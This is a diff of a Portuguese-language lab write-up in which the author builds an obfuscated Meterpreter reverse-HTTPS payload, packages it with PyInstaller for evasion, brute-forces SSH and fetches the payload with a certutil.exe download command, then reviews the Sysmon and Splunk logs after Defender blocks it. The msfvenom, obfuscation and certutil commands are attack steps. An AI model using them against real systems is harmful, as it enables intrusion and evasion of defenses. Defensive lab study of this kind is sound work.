@@ -2,11 +2,17 @@
 > *Exemplo: Detectando Injeção de DLL com Sysmon e Splunk*
 
 ## 📌 Resumo
-Neste eu criei um malware usando veil e apliquei algumas tecnicas de obfuscacao e encryptacao com o objetivo de passar pela seguranca de uma 
+Neste eu criei um shellcode usando metasploit e apliquei algumas tecnicas de obfuscacao e encryptacao com o objetivo de passar pela seguranca de uma 
 virtual machine e observar a reacao do sistema de defesa e os logs gerados por splunk e sysmon infelizmente (ou felizmente) o malware foi detectado pelo sistema windows 
 assim que foi baixado, entretanto todo o processo de criacao e execucao geraram muito conhecimento pratico que eu vou registrar aqui.  
 
 ---
+
+## 📌 AVISO 
+
+AVISO LEGAL: Este artigo é apenas para fins educacionais. Todas as atividades foram realizadas em ambientes isolados e controlados. 
+Nunca execute essas técnicas em sistemas que você não possui ou não tem autorização explícita. O uso indevido dessas informações é de responsabilidade exclusiva do leitor.
+
 
 ## ⚙️ Ambiente de Testes
 
@@ -22,12 +28,12 @@ assim que foi baixado, entretanto todo o processo de criacao e execucao geraram 
 
 ## 🧪 DETALHES TECNICOS 
  Durante a instalacao do Splunk eu tive alguns problemas para recebecer os logs sysmon no splunk GUI depois de muito procurar eu descobri que 
- era um problema de permissoes do windows 
+ era um problema de permissoes do windows, em services na aba log on e necessario que a opcao 'local system account' esteja selecionada, assim como na imagem 
 
  (PRINT DO PROGRAMA SERVICES/SPLUNK)
  ![Image](https://github.com/user-attachments/assets/6e6b6d0f-1e6f-417a-a815-d30c4effb318)
 
- E necessario que se insira este comando no arquivo input do splunk para receber os logs 
+ Para receber os logs em splunk voce deve colocar este codigo no arquvi output.conf caso ainda nao tenha sido configurado
   
   (PRINT DO ARQUIVO DE CONFIGURACAO SPLUNK)
 ![Image](https://github.com/user-attachments/assets/1c1531f3-a47a-4fe6-825c-bb597b36d014)
@@ -37,13 +43,12 @@ assim que foi baixado, entretanto todo o processo de criacao e execucao geraram 
 
 ## 🧪 SOBRE O MALWARE E OFUSCACAO 
  Para este artigo eu escolhi usar um shellcode metasploist e obfusca-lo com codigo python para este proposito foi escolhido esta opcao 
-  Este comando vai gerar um shellcode em .raw format pronto para converte-lo em hexadecimal string
+ 
 
 ```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```
 
-(PRINT PAYLOAD metasploit)
-
-comando para converter o resultado em codigo hexadecimal 
+Este comando vai gerar um shellcode em .raw format pronto para converte-lo em hexadecimal string apos ter gerado o 
+shellcode nos usamos este comando para converter o resultado em codigo hexadecimal 
 
 ```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```
 
@@ -56,9 +61,9 @@ comando para converter o resultado em codigo hexadecimal
 [PRINT DO VS CODE ENCRYPTACAO]
 ![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)
 
-Agora nos temos um shellcode pronto para ser inserido no codigo 
+Agora nos temos um shellcode pronto para ser inserido no codigo.
 
-# Diferenca entre *VirtualAlloc e xml HeapAlloc*     
+# Diferenca entre *VirtualAlloc e HeapAlloc*     
 
    Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
  pelo o que eu entendi ```xml VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
@@ -135,9 +140,7 @@ pyinstaller --noconfirm --onefile malwareobfuscated.py
 ```
 ![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)
 
-
-Entretando nos adicionamos mais um degrau de obfuscacao editando o arquivo .spec, com o objetivo de parecer ao maximo um programa normal
-do windows. 
+Este comando retornou um executavel pronto mas tambem um arquivo .spec que podemos usar para alterar algumas caracteristicas do malware para torna-lo mais dificil de ser detectado
 
 **.SPEC FILE** 
 
@@ -208,27 +211,31 @@ pyinstaller malwareobfuscated.spec
 
 ![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)
 
-[ PRINT OF CREATED MALWARE]
+Esse e o resultado final do processo de criacao agora estamos prontos para realizar a entrega do malware:
+
 ![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)
 
 
 ## DELIVERING THE PAYLOAD 
 
 Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o payload
-para realizar a requisicao vamos testar alguns executaveis nativos do windowns para aumentar o nivel de ofucacao
-
-[PRINT HYDRA]
-![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)
+para realizar a requisicao vamos usar um executavel chamado certutil.exe que foi criado para gerenciar certificados digitais mais tambem pode ser usado como LOLbin por atacantes que nao querem
+chamar atencao. 
 
  ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
- 
- [PRINT CERTUTIL COMMAND]
+
+
+Aqui realizei o brute force e consegui uma senha:
+
+![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)
+
+Logo apos realizei a requisicao usando certutil.exe como LOLbin:
+
+ [CERTUTIL.exe COMMAND]
 ![Image](https://github.com/user-attachments/assets/30188fa6-c789-4413-b6bb-342a29d9f40c)
 
 
-
-Certutil.exe é uma Living-off-the-Land Binary (LOLBAS) usada por atacantes para baixar cargas maliciosas via HTTP, 
-mas também, como podemos ver pelo output muito monitorada por antivirus modernos. Infelizmente eu nao consegui ofuscar o antivirus p suficiente deste vez 
+ Infelizmente eu nao consegui ofuscar o antivirus p suficiente a ponto de nao ser detectado pelo sistema de defesa
 porem ainda podemos analisar os logs gerados durante a acao.
 
 ![Image](https://github.com/user-attachments/assets/7647fae1-edd7-4f82-82a3-9d75d20fb688)
@@ -255,20 +262,28 @@ de login via ssh em um curto espaco de tempo caraterizando um brute force attack
 
 
 Como o malware foi bloquado antes de ser executado no foram gerados muitos logs em sysmon 
-porem dois logs me chamaram a atencao: 
+porem dois logs me chamaram a atencao. 
+
+Durante a execução do payload ofuscado, mesmo antes de um shell ser estabelecido, o Sysmon registrou o seguinte comportamento:
 
 1. [Creation of Remote Treat]
  ![Image](https://github.com/user-attachments/assets/405cbb63-bf4f-40df-a30c-8129ed814e56)
+Esse tipo de evento é típico de malwares que tentam executar código em outro processo para evitar detecção (como DLL injection). Apesar do Defender ou outro mecanismo ter bloqueado a carga útil antes da execução total, o evento mostra que o payload chegou a tentar a injeção de código na memória de outro processo. Isso por si só é uma IOC (Indicator of Compromise) que foi provavelmente o que acionou o segundo log
 
-2. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
+3. [ACAO DE BLOQUEIO DO WINDOWS DEFENDER]
 ![Image](https://github.com/user-attachments/assets/ea9fae2a-8fe5-4ef5-aea2-cf221346e740)
-
+Pouco após a tentativa de injeção de thread remota registrada pelo Sysmon (Event ID 8), o processo SecurityHealthHost.exe, parte do Windows Defender, foi invocado. Isso sugere que a carga maliciosa foi identificada e bloqueada pela solução nativa do sistema, interrompendo a execução completa do ataque.
 
 
 
 
 
 ##CONCLUSAO 
+
+Este laboratorio acabou sendo mais Read Team do que Bue Team, apesar de nao ter conseguido executar obfuscar o malware o sulficiente o processo de criacao 
+e tecnicas de ofuscacao me deram insight importantes para serem usados em laboratorios futuros. Em relacao a parte defensiva do projeto houveram menos eventos
+do que eu esperava, Splunk foi muito util para detectar os eventos de brute force e a ativacao do sistema de defesa mas o que eu acredito ter sido o aprendizado mais importante 
+foi o processo de instalao e configuracao do splunk. 
 
 
 
